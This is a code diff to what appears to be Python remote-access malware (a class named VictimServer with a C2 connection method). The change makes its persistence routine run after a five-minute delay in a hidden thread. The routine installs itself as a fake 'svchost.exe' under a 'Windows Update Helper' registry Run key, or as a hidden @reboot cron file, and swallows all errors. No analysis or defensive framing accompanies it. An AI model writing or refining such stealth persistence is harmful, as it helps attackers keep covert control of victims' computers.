@@ -46,27 +46,32 @@ class VictimServer:
             return os.getuid() == 0  # UNIX-like systems
 
     def persist(self):
-        """Cross-platform persistence"""
-        try:
-            if self.platform == 'windows':
-                exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
-                if not os.path.exists(exe_path):
-                    shutil.copy2(sys.argv[0], exe_path)
-                    subprocess.check_call(
-                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
-                        '/v "Windows Update Helper" /t REG_SZ /d "{}" /f'.format(exe_path),
-                        shell=True,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL
-                    )
-            else:
-                cron_path = '/etc/cron.d/.systemd'
-                if not os.path.exists(cron_path):
-                    with open(cron_path, 'w') as f:
-                        f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
-                    os.chmod(cron_path, 0o644)
-        except Exception as e:
-            pass
+        """Delayed persistence"""
+
+        def delayed_persist():
+            time.sleep(300)  # 5-minute delay
+            try:
+                if self.platform == 'windows':
+                    exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
+                    if not os.path.exists(exe_path):
+                        shutil.copy2(sys.argv[0], exe_path)
+                        subprocess.check_call(
+                            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                            f'/v "Windows Update Helper" /t REG_SZ /d "{exe_path}" /f',
+                            shell=True,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL
+                        )
+                else:
+                    cron_path = '/etc/cron.d/.systemd'
+                    if not os.path.exists(cron_path):
+                        with open(cron_path, 'w') as f:
+                            f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
+                        os.chmod(cron_path, 0o644)
+            except Exception:
+                pass
+
+        threading.Thread(target=delayed_persist, daemon=True).start()
 
     def connect_c2(self):
         """Connection handler with improved error reporting"""
